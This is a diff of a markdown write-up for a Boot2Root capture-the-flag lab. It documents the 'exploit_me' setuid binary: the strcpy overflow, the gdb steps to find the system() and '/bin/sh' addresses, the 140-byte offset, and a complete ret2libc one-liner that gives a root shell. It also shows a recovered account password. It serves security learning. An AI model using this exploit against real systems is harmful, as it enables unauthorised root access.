@@ -202,12 +202,34 @@ We then md5 SLASH in order to get zaz's password: "646da671ca01bb5d84dbb5fb2238d
 
 ------------------------------------------------------------------------------------------------------
 
-After connecting to zaz by ssh, we find a binary file called ***exploit_me***
-
 ** Buffer overflow
 
+After connecting to zaz by ssh, we find a binary file called ***exploit_me***
+
+Exploit_me has a particularity though, it has ***root rights***, meaning it has the right to execute root binaries limited to his reach :smirk 
+
+Lets check its content wih gdb and disasemble it:
+
 ![disas](https://github.com/Ziltoid42/Boot2Root_42/blob/master/bonus/images/disas.png)
-![system](https://github.com/Ziltoid42/Boot2Root_42/blob/master/bonus/images/system.png)
+
+And sure enough it uses the strcpy function, which is a well known security risk, as it doesn't compare the input size to its destination buffer. This allows to to atempt an attack by ret2libc
+
+
+- We place 3 breakpoints (```b * <address>```) in the program:
+  - One at the begining of the execution
+  - One at the call to strcpy
+  - One after the return value of strcpy
+
+- We then run the program a first time with a random input ```OSEF``` in order to get the buffer address
+- We get adsress of the system function with ```p system``` ![system](https://github.com/Ziltoid42/Boot2Root_42/blob/master/bonus/images/system.png)
+- Then we fetch the address of the char str "/bin/sh" with the command: ```find &system,+9999999, "/bin/sh"```
+- Finally we get the buffer size by substracting the address of $eip with the buffer address and find ***140***
+
+- This allows us to launch the ret2lib attack with this command: 
+
+```./exploit_me $(python -c "print('A'*140 + '\xb7\xe6\xb0\x60'[::-1] + 'OSEF' + '\xb7\xf8\xcc\x58'[::-1])")``` 
+Which gives us a shell with root access !
+
 ![congrats_overflow](https://github.com/Ziltoid42/Boot2Root_42/blob/master/bonus/images/congrats_overflow.png)
 
 
